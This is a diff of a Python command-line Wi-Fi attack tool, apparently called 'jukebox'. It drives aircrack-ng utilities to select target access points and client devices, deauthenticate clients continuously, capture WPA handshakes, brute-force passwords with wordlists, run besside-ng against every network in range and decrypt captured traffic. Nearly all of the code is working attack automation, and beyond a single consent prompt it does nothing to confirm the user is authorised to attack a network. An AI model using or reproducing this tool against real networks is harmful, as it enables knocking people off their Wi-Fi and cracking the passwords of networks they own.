@@ -19,12 +19,11 @@ target_router_oui = ""
 interface_mac_address = ""
 ap_list_of_target_oui = []
 device_list_of_target_ap = []
-terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
-
 ssid_map = {}
 ssid_counter = ''
 terminal_pids = []
-target_ap_key = 0
+
+terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
 terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
                       (800, 800)]  # top-right, middle-right, bottom-right, top-left, middle-left, bottom-left
 
@@ -113,6 +112,11 @@ def popen_command(command, killtime=0):
         process.wait()
         output, error = process.communicate()
         output = output.decode('latin1')  # sometimes airodump output causes issues with utf-8
+        error = error.decode('latin1')
+        return output, error
+    else:
+        output, error = process.communicate()
+        output = output.decode('latin1')
         error = error.decode('latin1')
         return output, error
 
@@ -237,22 +241,13 @@ def scan_for_networks():
     global ssid_counter
     output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
     if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
-        start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
-        end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
-        end_index = output.rfind(end_pattern)
-        start_index = output.rfind(start_pattern, 0, end_index)
-        if end_index == -1 or start_index == -1:
-            print('unknown pattern error 1')
-            return
-        else:
-            output = output[start_index:end_index]
         found_SSIDS = []
         ssid_counter = 0
         for row in output.split('\n'):
             column = row.split()
             if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
                     column[10]) == '][' and not str(
-                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
+                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:') and not str(column[10]).startswith('0>') and not str(column[10]).startswith('SAE') and not str(column[10]).startswith('(not associated)'):
                 if column[10] not in [ssid[1] for ssid in found_SSIDS]:
                     ssid_counter += 1
                     found_SSIDS.append([ssid_counter, column[10]])
@@ -263,6 +258,11 @@ def scan_for_networks():
 
 
 def deauthentication(target=target_bssid):
+    if not target_ap:
+        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
+            select_target_ap()
+        else:
+            return
     if target == target_bssid:
         popen_command_new_terminal(
             f'aireplay-ng --deauth 0 -a {target} --ignore-negative-one {selected_interface}')
@@ -312,19 +312,20 @@ def change_interface():
             elif int(selection) > interface_count:
                 print(f'Selected interface ({selection}) {red("does not exist")}')
 
-def select_target_ap(scan=True):
+def select_target_ap():
     clear()
     global target_ap
     global target_bssid
     global target_channel
     global target_ap_authentication
-    if scan:
+    if not ssid_map:
         scan_for_networks()
+    clear()
+    for key, value in ssid_map.items():
+        print("{:<2} {:<35} {:<17} {:<8} {:<2} {:<3}".format(f'{cyan(key)})', blue(value[0]), yellow(value[1]),
+                                                             green(value[2]), cyan(value[3]),
+                                                             magenta(value[4])))
     while 1:
-        for key, value in ssid_map.items():
-            print("{:<2} {:<35} {:<17} {:<8} {:<2} {:<3}".format(f'{cyan(key)})', blue(value[0]), yellow(value[1]),
-                                                                 green(value[2]), cyan(value[3]),
-                                                                 magenta(value[4])))
 
         print('\nif desired SSID is not listed, please return and scan again.')
         selection = input(f"\nEnter the number of the SSID {green('(type exit to return)')} : ")
@@ -336,49 +337,760 @@ def select_target_ap(scan=True):
                 target_bssid = ssid_map[int(selection)][1]
                 target_channel = ssid_map[int(selection)][3]
                 target_ap_authentication = ssid_map[int(selection)][4]
+                return
             elif int(selection) > len(ssid_map):
                 print(f'Selected interface ({selection}) {red("does not exist")}')
 
 
-
 def select_target_oui():
+    global selected_interface
+    selected_interface = 'wlan0'
+    if not ssid_map:
+        scan_for_networks()
+    grouped_by_oui = {}
+    for key,value in ssid_map.items():
+        oui = value[2]
+        if oui not in grouped_by_oui:
+            grouped_by_oui[oui] = [value[0]]
+        else:
+            grouped_by_oui[oui].append(value[0])
+    numbered_oui = {i + 1: oui for i, oui in enumerate(grouped_by_oui.keys())}
+    for key, value in numbered_oui.items():
+        print(f"{cyan(key)})  {yellow('OUI')}: {value} \n"
+              f"    {blue('SSIDs')}:", "{grouped_by_oui[value]}".replace('[','').replace(']','').replace('\'',''))
+    while True:
+        selection = input(
+            f"\nEnter the number of the {green('OUI')} of the target AP {green('(type exit to return)')} : ")
+        if selection.lower() == 'exit':
+            break
+        elif selection.isnumeric() and int(selection) in numbered_oui:
+            global target_router_oui
+            target_router_oui = numbered_oui[int(selection)]
+            break
+        else:
+            print(f'Invalid selection {red(selection)}')
 
-    # global target_router_oui
-    # global ap_list_of_target_oui
-    # ap_list_of_target_oui = []
-    # clear()
-    # popen_command(f'airodump-ng -w temp_output --output-format csv {selected_interface}', killtime=10)
-    # with open('temp_output-01.csv', 'r') as f:
-    #     reader = csv.reader(f)
-    #     data = [(row[0], row[-2]) for row in reader if len(row) >= 13 and ':' in row[0]]
-    # # Sort data by OUI
-    # data.sort(key=lambda x: x[0][:8])
-    # current_oui = ''
-    # print_list = []
-    # oui_list = []
-    #
-    # for mac, ssid in data:
-    #     oui = mac[:8]
-    #     if oui != current_oui and ssid != '' and oui != '00:00:00':
-    #         current_oui = oui
-    #         oui_list.append(oui)
-    #         print_list.append(f"OUI: {yellow(oui)}")
-    #     print_list.append(f" - {blue(ssid)} : {mac}")
-    # remove_files_with_prefix(os.getcwd(), 'temp_output')
-    # clear()
-    # for i in print_list:
-    #     print(f'{i}\n')
-    # while 1:
-    #     print(f'{blue("----------------------------------------------------------------------")}')
-    #     selected_oui = input(f'Select an {yellow("OUI")} from the output / {red("999")} to cancel : ').replace(f" ", "")
-    #     if selected_oui == '999':
-    #         return
-    #     elif selected_oui in oui_list:
-    #         target_router_oui = selected_oui
-    #         for mac, ssid in data:
-    #             if mac[:8] == target_router_oui:
-    #                 ap_list_of_target_oui.append(mac)
-    #         return
-    #     else:
-    #         print(print_list)
-    #         print(f'Selected {yellow("OUI")} ({green(selected_oui)}) {red("does not exist")}')
+#TODO test again
+def select_target_device():
+    global device_list_of_target_ap
+    device_list_of_target_ap = []
+    if not target_ap:
+        print(
+            f'To select a {yellow("target Device")} first select a {yellow("target AP")} to continue : ')
+        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
+            select_target_ap()
+        else:
+            return
+    global target_device
+    clear()
+    output, error = popen_command(f'airodump-ng -N {target_ap} -c {target_channel} {selected_interface}', killtime=5)
+    devices = []
+    for row in output.split('\n'):
+        column = row.split()
+        # print(repr(column))
+        if len(column) >= 7 and str(column[0] == target_bssid) and len(column[1]) == 17:
+            device = column[1]
+            if device not in devices and device != target_bssid:
+                devices.append(device)
+    devices_print = []
+    counter = 0
+    if devices:
+        clear()
+        for device in devices:
+            counter += 1
+            devices_print.append(f'{green(counter)} : {device}')
+        while 1:
+            for i in devices_print:
+                print(i)
+            selection = input("choose a target device : ")
+            if selection.isnumeric():
+                if counter >= int(selection) > 0:
+                    target_device = devices[int(selection) - 1]
+                    for device in devices:
+                        device_list_of_target_ap.append(device)
+                    return
+                elif int(selection) > counter:
+                    print(f'Selected device ({selection}) {red("does not exist")}')
+    else:
+        input(f'No Device is connected to {green(target_bssid)} Press enter to return : ')
+        return
+
+
+def remove_files_with_prefix(directory, prefix):
+    pattern = os.path.join(directory, prefix + '*')
+
+    files_to_remove = glob.glob(pattern)
+
+    for file_path in files_to_remove:
+        try:
+            os.remove(file_path)
+            print(f"Removed {file_path}")
+        except FileNotFoundError:
+            print(f"File {file_path} was not found (it may have been removed already).")
+        except Exception as e:
+            print(f"Error removing {file_path}: {e}")
+    return
+
+
+def switch_interface_channel():
+    run_command(f'iwconfig {selected_interface} channel {target_channel}')
+
+
+def capture_packets():
+    clear()
+    if not target_ap:
+        print(f'Select a {yellow("target AP")} to continue with this attack')
+        if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
+            select_target_ap()
+        return
+    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
+    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
+        print(f'Running packet capture on {green(target_ap)}')
+        print(f'Switching channel on  {green(selected_interface)} to {green(target_channel)}')
+        switch_interface_channel()
+        print(f'Running airodump {green(target_ap)} for 30 seconds ')
+        target_directory = f'/tmp/{target_ap}-Captures'
+        os.makedirs(target_directory, exist_ok=True)
+        airodump_capture_location = f'/tmp/{target_ap}-Captures/{target_ap}'
+        airodump = popen_command_new_terminal(
+            f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_capture_location} {selected_interface}')
+        time.sleep(30)
+        clear()
+        try:
+            os.killpg(airodump.pid, signal.SIGTERM)
+            airodump.wait()
+        except ProcessLookupError:
+            print('airodump killed unexpectedly', ProcessLookupError)
+
+        print(f"Packet Capture is saved in '{green('/tmp/{target_ap}-Captures/')}'")
+    else:
+        clear()
+        print(f'f{blue("-------------------------------------------------------------")}')
+        print(f'This message is from {green("capture_handshake")}')
+        print(f'There is a problem with {red("airodump-ng")}')
+        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
+        print(f'{red("AIRODUMP-NG STDERR ::")}\n{red(str(error))}')
+        input(f'Press enter to return :  ')
+        return
+def capture_handshake():
+    clear()
+
+    def recursion():
+        selection = input('\n Do you want to try again Y/N : ').lower()
+        while 1:
+            if selection == 'y':
+                capture_handshake()
+            elif selection == 'n':
+                return
+        return
+
+    if not target_ap:
+        print(f'Select a {yellow("target AP")} to continue with this attack')
+        if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
+            select_target_ap()
+        return
+    if target_ap_authentication == 'PSK':
+        input(target_ap_authentication)
+        clear()
+        print(f'Running packet capture on {green(target_ap)}')
+        print(
+            f'Switching channel on  {green(selected_interface)} to {green(target_channel)}')
+        switch_interface_channel()
+
+        target_directory = f'/tmp/{target_ap}-handshakeCapture'
+        os.makedirs(target_directory, exist_ok=True)
+
+        airodump_handshake_capture_location = f'/tmp/{target_ap}-handshakeCapture/{target_ap}'
+
+        print(f'Writing Capture files to {yellow(target_directory)}')
+
+        aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} {selected_interface}')
+
+        airodump = popen_command_new_terminal(
+            f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface}')
+
+        time.sleep(30)
+
+        os.killpg(airodump.pid, signal.SIGTERM)
+
+        airodump_output = ''
+        try:
+            os.killpg(aireplay.pid, signal.SIGTERM)
+            aireplay.wait()
+        except ProcessLookupError:
+            print('aireplay killed unexpectedly', ProcessLookupError)
+        try:
+            pattern = re.compile(r'handshake:')
+            airodump_output, error = airodump.communicate()
+            airodump.wait()
+            match = pattern.search(airodump_output)
+            if match:
+                clear()
+                print(f"\nHandshake capture {green('SUCCESSFUL')}")
+                print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
+                input('input anything to return to network attacks menu')
+                return
+
+            else:
+                clear()
+                print(f'Handshake capture {red("FAILED")}')
+                print(
+                    'Remember that in order to capture the handshake '
+                    'a device must try to connect to the target SSID')
+                print(
+                    'Reason for no handshake might be that no device was deauthenticated. '
+                    'Try changing the timeout variable of this script in the source code')
+                print(
+                    'Or it might be that the deauthenticated devices did not try to reconnect to the SSID '
+                    '(might happen if only a small amount of devices are connected to target SSID)')
+                remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
+                                         f'{target_ap}')
+                os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
+                recursion()
+                return
+        except ProcessLookupError:
+            print('airodump killed unexpectedly', ProcessLookupError)
+    else:
+        clear()
+        print('{target_ap_authentication} authentication is not supported for handshake capture')
+        print('Only PSK authentication is supported for handshake capture')
+        input(f"Press enter to return and select a AP that uses {yellow('PSK')} Authentication")
+        return
+
+
+def airdecap_wpa():
+    if not target_ap:
+        print(
+            f'To decrypt a capture file first select a {yellow("target AP")} to continue : ')
+        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
+            select_target_ap()
+        else:
+            return
+    while 1:
+        print(f'Here is the list of all cap files that start with {green(target_ap)} in /tmp\n')
+        print(run_command(f"find /tmp -type f -name '{target_ap}-*.cap'"))
+        capture_location = (input(
+            f'Type the address of (WPA/WPA2) packet capture of {green(target_ap)} you want to decrypt : ')
+                            .strip())
+        password_of_ap = input(f'Type the password of {green(target_ap)} you want to decrypt : ')
+        clear()
+        print(f'Capture file = {green(capture_location)}\n'
+              f'Password of {green(target_ap)} = {green(password_of_ap)}')
+        print(f' Type {green("E")} to return to network attacks')
+        selection = input('Is everything correct Y/N/E : ').lower()
+        if selection == 'y':
+            break
+        if selection == 'e':
+            return
+    clear()
+    print(f'Running decryption on {green(capture_location)} with airdecap \n')
+    output,error = popen_command(f'airdecap-ng -e {target_ap} -p {password_of_ap} {capture_location}')
+    if 'Could not open' in output:
+        print(f'{red("STDOUT")}  = {output}')
+        print(f'{red("STDERR")}  = {error}')
+        print(f'Decryption failed, possibly due to {red("mistype in capture file location")}')
+        input('Press enter to return ')
+        return
+    if 'Number of decrypted WPA  packets         0' in output:
+        print(f'{red("STDOUT")}  = {output}')
+        print(f'{red("STDERR")}  = {error}')
+        print(f'Decryption failed, possible mistype in {red("password")}')
+        input('Press enter to return ')
+        return
+    potential_decap_output = ''
+    if len(capture_location) >= 4:
+        potential_decap_output = capture_location[:-3]
+        potential_decap_output += 'dec.cap'
+    print(f'\nif airdecap was successful the decrypted output must be on {green(potential_decap_output)}')
+    input(f'Input anything to return to network attacks : ')
+
+
+def bruteforce_handshake_capture():
+    if not target_ap:
+        print(f'Select a {yellow("target AP")} to continue with this attack')
+        if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
+            select_target_ap()
+        return
+    search_pattern = f'/tmp/{target_ap}-handshakeCapture/{target_ap}*.cap'
+    matches = glob.glob(search_pattern)
+    if matches:
+        while 1:
+            clear()
+            print(f'{green(len(matches))} captures for the {green(target_ap)} found')
+            print(f'this software deletes the capture files that do not contain the handshake')
+            print(
+                f'so if the capture files were created using this software then all of the capture files should '
+                f'contain the handshake\n')
+            for match in matches:
+                print(green(match))
+            print('\n')
+
+            print(
+                f'If the handshake was captured using besside then the capture file is either {green(f"/tmp/{target_ap}-besside/wpa.cap")} or {green(f"/tmp/{target_ap}-besside/wep.cap")}')
+            print(
+                f'If you dont know which one to use then open them using {green("wireshark")} '
+                f'only one of the files should have packets inside. Use the file with the packets \n')
+
+            capture_file_address = input(
+                f'type the address of the .cap file to continue. for example /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap : ').strip()
+            print(f"selected capture file address is : {green(capture_file_address)} ")
+            selection = input("Type Y to continue Y ").lower()
+            if selection == 'y':
+                break
+    else:
+        while 1:
+            clear()
+            print(f'No Capture file found in /tmp/{target_ap}-handshakeCapture for {green(target_ap)}')
+            print(f'type the address of the .cap file to continue')
+            print(
+                f'Or type {red("N")} to return to Network attacks menu '
+                f'(type C1 in Network attacks to capture the handshake for {green(target_ap)})')
+            capture_file_address = input('address/N : ')
+            if capture_file_address == '999':
+                return
+            print(f"selected capture file address is : {green(capture_file_address)} ")
+            selection = input("Type Y to continue Y/N : ").lower()
+            if selection == 'y':
+                break
+    if capture_file_address == 'N' or capture_file_address == 'n':
+        return
+    else:
+        clear()
+        print(f"selected capture file address is : {green(capture_file_address)} \n")
+        print(f"Here are the password lists that can be used in bruteforce attack\n")
+
+        password_lists_directory_path = 'password_lists'
+        while 1:
+            for filename in os.listdir(password_lists_directory_path):
+
+                full_path = os.path.join(password_lists_directory_path, filename)
+
+                if os.path.isfile(full_path):
+                    print(green(filename))
+            print(f"\nType the name of the password list to be used in bruteforce attack (for example common.txt) : ")
+            print(f'or type {green("1")} to give a path to your own password list : ')
+            print(
+                f'or type {green("999")} to cancel bruteforce attack and return to network attacks menu : '
+                f'\n')
+            selected_password_list = input(f'filename/1/999 : ').strip()
+            if selected_password_list == '999':
+                return
+            if selected_password_list == '1':
+                selected_password_list = input(f'give a path to your own password list : ').strip()
+                print(f'your password list is {green(selected_password_list)}')
+                selection = input(
+                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
+                if selection == 'y':
+                    break
+            else:
+                print(f'your password list is {green(selected_password_list)}')
+                selection = input(
+                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
+                if selection == 'y':
+                    selected_password_list = f'password_lists/{selected_password_list}'
+                    break
+
+        clear()
+        print(
+            f'Running aircrack on {green(target_ap)}'
+            f' using wordlist in {green(selected_password_list)} ')
+
+        target_directory = f'/tmp/{target_ap}-password'
+        os.makedirs(target_directory, exist_ok=True)
+        aircrack_script = f'aircrack-ng -w {selected_password_list} -b {target_bssid} -l {target_directory}/{target_ap}.txt {capture_file_address}'
+        for terminal in terminals:
+            subprocess.Popen(f'{terminal} -e {aircrack_script}', shell=True, preexec_fn=os.setsid, )
+            print(f'aircrack-ng -w {selected_password_list} -b {target_bssid} {capture_file_address}')
+            print('\n')
+            print(
+                f'Process Complete. To check if password is found '
+                f'look at {green(f"{target_directory}/{target_ap}.txt")}')
+            input('press enter to return to network attacks')
+            return
+
+
+def besside():
+    clear()
+    print(f'{red("besside-ng is an automated script that captures Handshakes of all Networks in range")}')
+    consent = input('continue (yes/no): ').lower()
+    if consent == 'yes':
+        clear()
+        timer = 5
+        while timer > 0:
+            print(f"Attack starts in {timer}")
+            time.sleep(1)
+            timer -= 1
+        for terminal in terminals:
+            target_directory = f'/tmp/besside-all'
+            os.makedirs(target_directory, exist_ok=True)
+            besside_process = subprocess.Popen(f'{terminal} -e besside-ng {selected_interface}',
+                                               shell=True,
+                                               preexec_fn=os.setsid,
+                                               cwd=target_directory)
+            besside_process.wait()
+            print(f'Process is Complete\n',
+                  f'To check if handshake capture was successful look at the {green("besside.log")} '
+                  f'in {green(target_directory)}\n')
+            print(
+                f'If any handshake was captured then either use {green("wep.cap")} '
+                f'or {green("wpa.cap")} with aircrack to bruteforce password')
+            print(
+                f'If you dont know which one to use then open them using {green("wireshark")} '
+                f'only one of the files should have packets inside. Use the file with the packets \n')
+
+            print('\nWPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
+                  'Wpa.darkircop.com also provides useful statistics based on user-submitted capture files about the '
+                  'feasibility of WPA cracking.')
+
+            input('input anything to return to network attacks menu : ')
+            return
+
+def besside_target_ap():
+    if not target_ap:
+        print(f'Select a {yellow("target AP")} to continue : ')
+        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
+            select_target_ap()
+        else:
+            return
+    clear()
+    for terminal in terminals:
+        target_directory = f'/tmp/{target_ap}-besside'
+        os.makedirs(target_directory, exist_ok=True)
+
+        besside_process = subprocess.Popen(f'{terminal} -e besside-ng -b {target_bssid} {selected_interface}',
+                                           shell=True,
+                                           preexec_fn=os.setsid,
+                                           cwd=target_directory)
+        besside_process.wait()
+        print(f'Process is Complete\n',
+              f'To check if handshake capture was successful look at the {green("besside.log")} '
+              f'in {green(target_directory)}\n')
+        print(f'If handshake was captured then either use {green("wep.cap")} '
+              f'or {green("wpa.cap")} with aircrack to bruteforce password')
+        print(f''
+              f'If you dont know which one to use then open them using {green("wireshark")} '
+              f'only one of the files should have packets inside. Use the file with the packets \n')
+        input('input anything to return to network attacks menu : ')
+        return
+
+
+def graph_networks():
+    if not target_ap:
+        print(
+            f'To graph a {yellow("AP")} first select a {yellow("target AP")} to continue : ')
+        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
+            select_target_ap()
+        else:
+            return
+    clear()
+    print(f"To graph a network first you need to have a {green('csv')} file captured with airodump\n")
+    print(f'Here is the list of all csv files that start with {green(target_ap)} in /tmp/ directory\n')
+    print(run_command(f"find /tmp/ -type f -name '{target_ap}-*.csv' ! -name '*log.csv' ! -name '*kismet.csv'"))
+    print(f'\ntype the address of the .csv file to continue')
+    print(
+        f'Or type {red("N")} to return to Network attacks menu '
+        f'(use Network attacks to capture packets for {green(target_ap)})')
+    while 1:
+        capture_file_address = input('address/N : ').strip()
+        if capture_file_address == 'n' or capture_file_address == 'N':
+            return
+        print(f" selected address is {green(capture_file_address)}")
+        selection = input(
+            'input Y to continue with this address (input anything else to select another address):').lower().strip()
+        if selection == 'y':
+            break
+    clear()
+    print(f"Using {green('airgraph-ng')}  with {green(capture_file_address)}")
+
+    while 1:
+        selection = input('CAPR / CPG : ').lower()
+        if selection == 'capr':
+            graph_output_location = f'/tmp/{target_ap}-CAPR'
+            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CAPR'
+            break
+        if selection == 'cpg':
+            graph_output_location = f'/tmp/{target_ap}-CPG'
+            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CPG'
+            break
+    airgraph = popen_command_new_terminal(airgraph_command)
+    airgraph.wait()
+    input(f'output saved in {graph_output_location} press enter to continue')
+    return
+
+old_art = [
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀ ",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀",
+    "⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀",
+    "⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀",
+    "⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀",
+    "⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀",
+    "⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁",
+    '\n'
+],
+ascii_arts = [
+    [
+        "       _       __        __              ",
+        "      (_)_  __/ /_____  / /_  ____  _  __",
+        "     / / / / / //_/ _ \\/ __ \\/ __ \\| |/_/",
+        "    / / /_/ / ,< /  __/ /_/ / /_/ />  <  ",
+        " __/ /\\__,_/_/|_|\\___/_.___/\\____/_/|_|  ",
+        "/___/                                    "
+    ],
+    [
+        "     ▄█ ███    █▄     ▄█   ▄█▄    ▄████████ ▀█████████▄   ▄██████▄  ▀████    ▐████▀ ",
+        "    ███ ███    ███   ███ ▄███▀   ███    ███   ███    ███ ███    ███   ███▌   ████▀  ",
+        "    ███ ███    ███   ███▐██▀     ███    █▀    ███    ███ ███    ███    ███  ▐███    ",
+        "    ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███    ▀███▄███▀    ",
+        "    ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███    ████▀██▄     ",
+        "    ███ ███    ███   ███▐██▄     ███    █▄    ███    ██▄ ███    ███   ▐███  ▀███    ",
+        "    ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ ███    ███  ▄███     ███▄  ",
+        "█▄ ▄███ ████████▀    ███   ▀█▀   ██████████ ▄█████████▀   ▀██████▀  ████       ███▄ ",
+        "▀▀▀▀▀▀               ▀                                                               "
+    ],
+    [
+        "________       ______      ______               ",
+        "______(_)___  ____  /_________  /___________  __",
+        "_____  /_  / / /_  //_/  _ \\_  __ \\  __ \\_  |/_/",
+        "____  / / /_/ /_  ,<  /  __/  /_/ / /_/ /_>  <  ",
+        "___  /  \\__,_/ /_/|_| \\___//_.___/\\____//_/|_|  ",
+        "/___/                                            "
+    ],
+    [
+        " ▄▄▄██▀▀▀█    ██  ██ ▄█▀▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒",
+        "   ▒██   ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░",
+        "   ░██  ▓██  ▒██░▓███▄░ ▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░",
+        "▓██▄██▓ ▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒ ",
+        " ▓███▒  ▒▒█████▓ ▒██▒ █▄░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒",
+        " ▒▓▒▒░  ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░",
+        " ▒ ░▒░  ░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░",
+        " ░ ░ ░   ░░░ ░ ░ ░ ░░ ░    ░    ░    ░ ░ ░ ░ ▒   ░    ░  ",
+        " ░   ░     ░     ░  ░      ░  ░ ░          ░ ░   ░    ░  ",
+        "                                     ░                   "
+    ],
+    [
+        " ▄▄▄██▀▀▀█    ██  ██ ▄█▀▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒",
+        "   ▒██   ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░",
+        "   ░██  ▓██  ▒██░▓███▄░ ▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░",
+        "▓██▄██▓ ▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒ ",
+        " ▓███▒  ▒▒█████▓ ▒██▒ █▄░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒",
+        " ▒▓▒▒░  ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░",
+        " ▒ ░▒░  ░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░",
+        " ░ ░ ░   ░░░ ░ ░ ░ ░░ ░    ░    ░    ░ ░ ░ ░ ▒   ░    ░  ",
+        " ░   ░     ░     ░  ░      ░  ░ ░          ░ ░   ░    ░  ",
+        "                                     ░                   "
+    ],
+    [
+        "      ███             █████               █████                         ",
+        "     ░░░             ░░███               ░░███                          ",
+        "     █████ █████ ████ ░███ █████  ██████  ░███████   ██████  █████ █████",
+        "    ░░███ ░░███ ░███  ░███░░███  ███░░███ ░███░░███ ███░░███░░███ ░░███ ",
+        "     ░███  ░███ ░███  ░██████░  ░███████  ░███ ░███░███ ░███ ░░░█████░  ",
+        "     ░███  ░███ ░███  ░███░░███ ░███░░░   ░███ ░███░███ ░███  ███░░░███ ",
+        "     ░███  ░░████████ ████ █████░░██████  ████████ ░░██████  █████ █████",
+        "     ░███   ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░░░░   ░░░░░░  ░░░░░ ░░░░░ ",
+        " ███ ░███                                                                ",
+        "░░██████                                                                 ",
+        " ░░░░░░                                                                 "
+    ]
+]
+
+
+def interface_options():
+    for options in Interface_Options:
+        print(options)
+
+
+def wireless_options():
+    for options in wireless_attacks:
+        print(options)
+
+
+Interface = ["Interface", interface_options]
+Wireless = ["Wireless", wireless_options]
+
+Section = Interface
+Previous_Section = Interface
+
+if __name__ == "__main__":
+    while exit != "exit":
+        interface_mode = ''
+        if selected_interface != '' and check_if_selected_interface_in_monitor_mode:
+            interface_mode = 'Monitor'
+        elif selected_interface != '' and not check_if_selected_interface_in_monitor_mode:
+            interface_mode = 'Managed'
+        clear()
+        art = random.choice(ascii_arts)
+        for i in art:
+            print(i)
+        print()
+        Interface_Options = [
+            f'{blue("--------------------------------------------------------")}',
+            f'{green("1)")} Select Interface',
+            f'{blue("--------------------------------------------------------")}',
+            f"{green('2)')} Change Interface to monitor mode",
+            f"{green('3)')} Change Interface to managed mode",
+            f"{green('4)')} Change Interface MAC Address",
+            f'{blue("--------------------------------------------------------")}',
+            f'{yellow("Interface ")}     : {cyan(selected_interface)}',
+            f'{yellow("Interface Mode")} : {cyan(interface_mode)}',
+            f'{yellow("Interface MAC ")} : {cyan(interface_mac_address)}',
+            f'{blue("--------------------------------------------------------")}',
+            f"{green('N)')} Network Attacks",
+            f'{blue("--------------------------------------------------------")}',
+            f"{green('exit')} to close the program",
+            f'{blue("--------------------------------------------------------")}',
+
+        ]
+
+        wireless_attacks = [
+            f"{blue('------------------------------------------------------------------')}",
+            f"{green('1)')} Select a {yellow('target AP')}",
